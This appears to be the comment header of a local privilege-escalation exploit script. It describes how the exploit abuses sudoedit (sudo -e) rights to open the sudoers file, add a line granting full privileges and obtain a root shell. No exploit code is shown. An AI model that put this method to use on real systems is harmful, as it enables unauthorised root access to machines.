# Running this exploit on a vulnerable system allows a localiattacker to gain 
# a root shell on the machine.
#
# The exploit checks if the current user has privileges to run sudoedit or 
# sudo -e on a file as root. If so it will open the sudoers file for the
# attacker to add a line to gain privileges on all the files and get a root 
# shell.
